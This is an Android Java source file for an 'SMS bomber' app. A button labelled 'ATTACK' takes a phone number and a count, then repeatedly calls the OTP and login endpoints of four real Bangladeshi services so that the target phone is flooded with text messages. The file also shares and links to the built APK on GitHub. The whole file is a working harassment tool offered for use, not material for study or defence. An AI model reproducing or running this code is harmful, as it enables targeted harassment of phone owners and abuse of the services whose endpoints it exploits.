package com.example.smsbomber;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.drawerlayout.widget.DrawerLayout;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private EditText numberEditText, amountEditText;
    private Button attackButton;
    private TextView resultTextView;
    private ProgressBar progressBar;
    public DrawerLayout drawerLayout;
    public ActionBarDrawerToggle actionBarDrawerToggle;
    public String nVersion;
    public String version;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_main);

        // drawer and back button to close drawer
        drawerLayout = findViewById(R.id.my_drawer_layout);
        actionBarDrawerToggle = new ActionBarDrawerToggle(this, drawerLayout, R.string.nav_open, R.string.nav_close);

        drawerLayout.addDrawerListener(actionBarDrawerToggle);
        actionBarDrawerToggle.syncState();

        // to make the Navigation drawer icon always appear on the action bar
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);



        numberEditText = findViewById(R.id.text1);
        amountEditText = findViewById(R.id.text2);
        attackButton = findViewById(R.id.click);
        resultTextView = findViewById(R.id.tView);
        attackButton.setOnClickListener(this);
        progressBar = findViewById(R.id.progressBar);
        progressBar.setVisibility(View.INVISIBLE);
        resultTextView.setText("");

        version = "1.2";

        // Declaring a layout (changes are to be made to this)
        // Declaring a textview (which is inside the layout)
        SwipeRefreshLayout swipeRefreshLayout = (SwipeRefreshLayout)findViewById(R.id.refreshLayout);

        // Refresh  the layout
        swipeRefreshLayout.setOnRefreshListener(
                new SwipeRefreshLayout.OnRefreshListener() {
                    @Override
                    public void onRefresh() {
                        numberEditText.setText("");
                        amountEditText.setText("");
                        attackButton.setBackgroundColor(Color.parseColor("#DE1E1E"));
                        attackButton.setText("ATTACK");
                        resultTextView.setText("");
                        attackButton.setEnabled(true);
                        swipeRefreshLayout.setRefreshing(false);
                        progressBar.setVisibility(View.INVISIBLE);
                    }
                }
        );


        if (!isNetworkAvailable()) {
            Toast.makeText(MainActivity.this, "Please Connect Internet", Toast.LENGTH_SHORT);
        }


    }


    @Override
    public void onClick(View v) {

        try {
            if (v.getId() == R.id.click) {
                String mobile = numberEditText.getText().toString();
                String amnt = amountEditText.getText().toString();
                if (mobile.equals("") || amnt.equals("")) {
                    Toast.makeText(MainActivity.this, "Enter Valid Number or Amount", Toast.LENGTH_SHORT).show();
                    return;
                } else {

                    attackButton.setEnabled(false);
                    progressBar.setVisibility(View.VISIBLE);
                    int amount = Integer.parseInt(amnt);

                    Thread thread = new Thread(){
                        @Override
                        synchronized public void run() {
                            attackButton.setBackgroundColor(Color.parseColor("#608832"));
                            attackButton.setText("Wait");
                            int amt = (amount+1)/4;
                            for (int i = 0; i <= amt+1; i++) {
                                swapnoApi(mobile);
                                blshopApi(mobile);
                                bongobdApi(mobile);
                                bioscopeApi(mobile);
                                try {
                                    sleep(15000);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }

                            }
                            attackButton.setBackgroundColor(Color.parseColor("#2294A3"));
                            attackButton.setText("Succeed");
                            resultTextView.setText("Swipe Down to Refresh");
                            progressBar.setVisibility(View.INVISIBLE);
                        }
                    };
                    thread.start();
                }

            }
        } catch (Exception e) {
            resultTextView.setText("Unsuccessfull");
        }

    }

    private void swapnoApi(String mobile) {
        String url = String.valueOf("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=" + mobile + "&countryPhoneCode=%2B88");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        });
        queue.add(stringRequest);
    }

    private void blshopApi(String mobile) {
        String url = String.valueOf("https://eshop.banglalink.net/wp-admin/admin-ajax.php");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        }) {
            @Override
            public String getBodyContentType() {
                return "application/x-www-form-urlencoded; charset=UTF-8";
            }

            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("action", "otpRegistration");
                params.put("otpMobile", mobile);
                return params;
            }

        };
        queue.add(stringRequest);
    }

    private void bongobdApi(String mobile) {
        // url to post our data
        String url = "https://api.bongo-solutions.com/auth/api/login/send-otp";

        // creating a new variable for our request queue
        RequestQueue queue = Volley.newRequestQueue(MainActivity.this);

        StringRequest request = new StringRequest(Request.Method.POST, url, new com.android.volley.Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                // on below line we are displaying a success toast message.
                //Toast.makeText(MainActivity.this, "Data added to API", Toast.LENGTH_SHORT).show();
                try {
                    // on below line we are passing our response
                    // to json object to extract data from it.
                    JSONObject respObj = new JSONObject(response);

                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new com.android.volley.Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // method to handle errors.
                //Toast.makeText(MainActivity.this, "Fail to get response = " + error, Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                // below line we are creating a map for
                // storing our values in key and value pair.
                Map<String, String> params = new HashMap<String, String>();

                // on below line we are passing our key
                // and value pair to our parameters.
                params.put("operator", "all");
                params.put("msisdn", String.valueOf("88" + mobile));
                // at last we are
                // returning our params.
                return params;
            }
        };
        // below line is to make
        // a json object request.
        queue.add(request);
    }

    private void bioscopeApi(String mobile) {
        String url = String.valueOf("https://www.bioscopelive.com/bn/login/send-otp?phone=88" + mobile + "&operator=bd-otp");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        });
        queue.add(stringRequest);
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater menuInflater = getMenuInflater();
        menuInflater.inflate(R.menu.menu_2layout, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (actionBarDrawerToggle.onOptionsItemSelected(item)) {
            return true;
        }

        if (item.getItemId() == R.id.srid) {
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType("text/plain");
            String subject = "Anything what you want...";
            String body = "https://github.com/wizard-carlo/APK/blob/main/bomber.apk";
            intent.putExtra(Intent.EXTRA_SUBJECT, subject);
            intent.putExtra(Intent.EXTRA_TEXT, body);
            startActivity(Intent.createChooser(intent, "Share with"));
        }
        if (item.getItemId() == R.id.usid) {
            Intent intent = new Intent(this, AboutUs.class);
            startActivity(intent);
        }

        if(item.getItemId()==R.id.updateid){

            DatabaseReference mDatabase;
            nVersion = "";
            mDatabase = FirebaseDatabase.getInstance().getReference();
            mDatabase.child("version").get().addOnCompleteListener(new OnCompleteListener<DataSnapshot>() {
                @Override
                public void onComplete(@NonNull Task<DataSnapshot> task) {
                    if (!task.isSuccessful()) {
                        Log.e("firebase", "Error getting data", task.getException());
                        //Toast.makeText(MainActivity.this,task.getException().toString(),Toast.LENGTH_LONG).show();
                        updateIntentCall();
                    }
                    else {
                        Log.d("firebase", String.valueOf(task.getResult().getValue()));
                        //Toast.makeText(MainActivity.this,version,Toast.LENGTH_LONG).show();
                        nVersion = String.valueOf(task.getResult().getValue());
                        if(version.equals(nVersion)){
                            Toast.makeText(MainActivity.this,"Your version is up to date",Toast.LENGTH_LONG).show();
                        }
                        else{
                            updateIntentCall();
                        }
                    }
                }
            });
        }

        return super.onOptionsItemSelected(item);


    }
    public void updateIntentCall(){
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        intent.setData(Uri.parse("https://github.com/wizard-carlo/APK/blob/main/bomber.apk"));
        startActivity(intent);
    }

}